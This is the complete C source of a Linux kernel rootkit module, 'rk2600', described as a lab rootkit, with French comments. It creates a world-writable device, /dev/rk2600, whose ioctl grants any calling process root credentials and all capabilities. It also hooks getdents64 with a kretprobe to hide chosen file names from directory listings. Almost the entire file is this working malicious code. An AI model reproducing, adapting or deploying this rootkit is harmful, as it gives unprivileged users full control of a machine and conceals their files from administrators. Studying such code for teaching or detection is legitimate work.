// SPDX-License-Identifier: GPL-2.0
/*
 * rk2600.c - cote noyau du rootkit de laboratoire rk2600.
 *
 * Le module enregistre le peripherique misc /dev/rk2600 que l'outil
 * compagnon pilote par ioctl(2) :
 *
 *   RK2600_IOC_STATUS  : renvoie la version d'API du module ;
 *   RK2600_IOC_ELEVATE : accorde les privileges root a l'appelant ;
 *   RK2600_IOC_HIDE    : masque un nom d'entree de repertoire ;
 *   RK2600_IOC_UNHIDE  : reaffiche un nom precedemment masque.
 *
 * Le masquage est realise par un kretprobe sur l'appel systeme
 * getdents64 : le tampon d'enregistrements rendu a l'espace utilisateur
 * est reecrit pour que les noms enregistres disparaissent du listing.
 */

#include <linux/capability.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#include "rk2600_protocol.h"

#define RK2600_LOG_PREFIX "rk2600: "

/*
 * Liste des noms masques. Le kretprobe s'executant en contexte atomique,
 * la protection se fait par spinlock et non par mutex.
 */
struct rk2600_hidden_entry {
	struct list_head list;
	char name[RK2600_NAME_MAX + 1U];
};

static LIST_HEAD(rk2600_hidden_list);
static DEFINE_SPINLOCK(rk2600_hidden_lock);

/* ------------------------------------------------------------------ */
/* Liste des noms masques                                             */
/* ------------------------------------------------------------------ */

static bool rk2600_is_hidden(const char *name)
{
	struct rk2600_hidden_entry *entry;
	unsigned long flags;
	bool hidden = false;

	spin_lock_irqsave(&rk2600_hidden_lock, flags);
	list_for_each_entry(entry, &rk2600_hidden_list, list) {
		if (strcmp(entry->name, name) == 0) {
			hidden = true;
			break;
		}
	}
	spin_unlock_irqrestore(&rk2600_hidden_lock, flags);

	return hidden;
}

static int rk2600_hide_name(const char *name)
{
	struct rk2600_hidden_entry *entry;
	unsigned long flags;
	bool already_hidden = false;

	spin_lock_irqsave(&rk2600_hidden_lock, flags);
	list_for_each_entry(entry, &rk2600_hidden_list, list) {
		if (strcmp(entry->name, name) == 0) {
			already_hidden = true;
			break;
		}
	}
	spin_unlock_irqrestore(&rk2600_hidden_lock, flags);

	if (already_hidden)
		return 0;

	entry = kmalloc(sizeof(*entry), GFP_KERNEL);
	if (entry == NULL)
		return -ENOMEM;

	strscpy(entry->name, name, sizeof(entry->name));

	spin_lock_irqsave(&rk2600_hidden_lock, flags);
	list_add_tail(&entry->list, &rk2600_hidden_list);
	spin_unlock_irqrestore(&rk2600_hidden_lock, flags);

	return 0;
}

static int rk2600_unhide_name(const char *name)
{
	struct rk2600_hidden_entry *entry;
	struct rk2600_hidden_entry *tmp;
	unsigned long flags;
	int result = -ENOENT;

	spin_lock_irqsave(&rk2600_hidden_lock, flags);
	list_for_each_entry_safe(entry, tmp, &rk2600_hidden_list, list) {
		if (strcmp(entry->name, name) == 0) {
			list_del(&entry->list);
			result = 0;
			break;
		}
	}
	spin_unlock_irqrestore(&rk2600_hidden_lock, flags);

	if (result == 0)
		kfree(entry);

	return result;
}

/* ------------------------------------------------------------------ */
/* Validation des entrees utilisateur                                 */
/* ------------------------------------------------------------------ */

static int rk2600_validate_name(const struct rk2600_name_request *request)
{
	size_t length;

	length = strnlen(request->name, sizeof(request->name));
	if (length == 0U || length == sizeof(request->name))
		return -EINVAL;

	if (strchr(request->name, '/') != NULL)
		return -EINVAL;

	if (strcmp(request->name, ".") == 0 ||
	    strcmp(request->name, "..") == 0)
		return -EINVAL;

	return 0;
}

/* ------------------------------------------------------------------ */
/* Elevation de privileges                                            */
/* ------------------------------------------------------------------ */

static int rk2600_elevate(void)
{
	struct cred *credentials;

	credentials = prepare_creds();
	if (credentials == NULL)
		return -ENOMEM;

	credentials->uid = GLOBAL_ROOT_UID;
	credentials->euid = GLOBAL_ROOT_UID;
	credentials->suid = GLOBAL_ROOT_UID;
	credentials->fsuid = GLOBAL_ROOT_UID;

	credentials->gid = GLOBAL_ROOT_GID;
	credentials->egid = GLOBAL_ROOT_GID;
	credentials->sgid = GLOBAL_ROOT_GID;
	credentials->fsgid = GLOBAL_ROOT_GID;

	credentials->cap_effective = CAP_FULL_SET;
	credentials->cap_permitted = CAP_FULL_SET;

	commit_creds(credentials);

	return 0;
}

/* ------------------------------------------------------------------ */
/* Hook getdents64                                                    */
/* ------------------------------------------------------------------ */

struct rk2600_getdents_data {
	unsigned int fd;
	void __user *buffer;
	unsigned int count;
};

static int rk2600_getdents_entry(struct kretprobe_instance *instance,
				 struct pt_regs *regs)
{
	struct rk2600_getdents_data *data;

	data = (struct rk2600_getdents_data *)instance->data;
	data->fd = (unsigned int)regs->di;
	data->buffer = (void __user *)regs->si;
	data->count = (unsigned int)regs->dx;

	return 0;
}

static int rk2600_getdents_return(struct kretprobe_instance *instance,
				  struct pt_regs *regs)
{
	struct rk2600_getdents_data *data;
	unsigned char *buffer;
	unsigned long offset = 0;
	unsigned long remaining;
	long result;

	data = (struct rk2600_getdents_data *)instance->data;
	result = regs_return_value(regs);

	if (result <= 0 || data->buffer == NULL)
		return 0;

	if ((unsigned long)result > data->count)
		return 0;

	buffer = kmalloc((size_t)result, GFP_ATOMIC);
	if (buffer == NULL)
		return 0;

	if (copy_from_user(buffer, data->buffer, (unsigned long)result)) {
		kfree(buffer);
		return 0;
	}

	remaining = (unsigned long)result;

	/*
	 * Parcours des enregistrements. Un enregistrement masque est retire
	 * du flux en decalant tout ce qui le suit ; l'offset n'avance pas
	 * pour reexaminer l'entree qui vient d'etre recopiee.
	 */
	while (offset + offsetof(struct linux_dirent64, d_name) < remaining) {
		struct linux_dirent64 *entry;
		unsigned long record_length;

		entry = (struct linux_dirent64 *)(buffer + offset);
		record_length = entry->d_reclen;

		if (record_length < offsetof(struct linux_dirent64, d_name) + 1U)
			break;
		if (offset + record_length > remaining)
			break;

		if (rk2600_is_hidden(entry->d_name)) {
			memmove(buffer + offset,
				buffer + offset + record_length,
				remaining - offset - record_length);
			remaining -= record_length;
		} else {
			offset += record_length;
		}
	}

	if (remaining != (unsigned long)result) {
		if (copy_to_user(data->buffer, buffer, remaining) == 0)
			regs_set_return_value(regs, (long)remaining);
	}

	kfree(buffer);

	return 0;
}

static struct kretprobe rk2600_getdents_probe = {
	.entry_handler = rk2600_getdents_entry,
	.handler = rk2600_getdents_return,
	.data_size = sizeof(struct rk2600_getdents_data),
	.maxactive = 64,
};

/*
 * Selon la configuration du noyau, le wrapper syscall x86_64 est soit
 * __x64_sys_getdents64, soit sys_getdents64 : on tente les deux.
 */
static const char *const rk2600_getdents_symbols[] = {
	"__x64_sys_getdents64",
	"sys_getdents64",
};

static int rk2600_register_getdents_probe(void)
{
	size_t index;

	for (index = 0; index < ARRAY_SIZE(rk2600_getdents_symbols); index++) {
		rk2600_getdents_probe.kp.symbol_name =
			rk2600_getdents_symbols[index];

		if (register_kretprobe(&rk2600_getdents_probe) == 0)
			return 0;
	}

	return -ENOENT;
}

/* ------------------------------------------------------------------ */
/* Pilote misc et ioctl                                               */
/* ------------------------------------------------------------------ */

static long rk2600_ioctl(struct file *file, unsigned int command,
			 unsigned long argument)
{
	struct rk2600_status status;
	struct rk2600_name_request request;
	int result;

	switch (command) {
	case RK2600_IOC_STATUS:
		status.api_version = RK2600_API_VERSION;
		status.reserved = 0U;

		if (copy_to_user((void __user *)argument, &status,
				 sizeof(status)))
			return -EFAULT;

		return 0;

	case RK2600_IOC_ELEVATE:
		return rk2600_elevate();

	case RK2600_IOC_HIDE:
	case RK2600_IOC_UNHIDE:
		if (copy_from_user(&request, (void __user *)argument,
				   sizeof(request)))
			return -EFAULT;

		result = rk2600_validate_name(&request);
		if (result != 0)
			return result;

		if (command == RK2600_IOC_HIDE)
			return rk2600_hide_name(request.name);

		return rk2600_unhide_name(request.name);

	default:
		return -ENOTTY;
	}
}

static const struct file_operations rk2600_fops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl = rk2600_ioctl,
#ifdef CONFIG_COMPAT
	.compat_ioctl = rk2600_ioctl,
#endif
	.llseek = no_llseek,
};

static struct miscdevice rk2600_misc_device = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = RK2600_DEVICE_NAME,
	.fops = &rk2600_fops,
	.mode = 0666,
};

/* ------------------------------------------------------------------ */
/* Chargement / dechargement                                          */
/* ------------------------------------------------------------------ */

static int __init rk2600_init(void)
{
	int result;

	result = misc_register(&rk2600_misc_device);
	if (result != 0) {
		pr_err(RK2600_LOG_PREFIX
		       "enregistrement du peripherique misc impossible: %d\n",
		       result);
		return result;
	}

	result = rk2600_register_getdents_probe();
	if (result != 0) {
		pr_err(RK2600_LOG_PREFIX
		       "hook getdents64 impossible: %d\n", result);
		misc_deregister(&rk2600_misc_device);
		return result;
	}

	pr_info(RK2600_LOG_PREFIX "charge, version d'API %u\n",
		RK2600_API_VERSION);

	return 0;
}

static void __exit rk2600_exit(void)
{
	struct rk2600_hidden_entry *entry;
	struct rk2600_hidden_entry *tmp;

	unregister_kretprobe(&rk2600_getdents_probe);
	misc_deregister(&rk2600_misc_device);

	list_for_each_entry_safe(entry, tmp, &rk2600_hidden_list, list) {
		list_del(&entry->list);
		kfree(entry);
	}

	pr_info(RK2600_LOG_PREFIX "decharge\n");
}

module_init(rk2600_init);
module_exit(rk2600_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rk2600 - rootkit de laboratoire (misc device + masquage getdents64)");
MODULE_AUTHOR("Groupe 2600");
MODULE_VERSION("1.0");
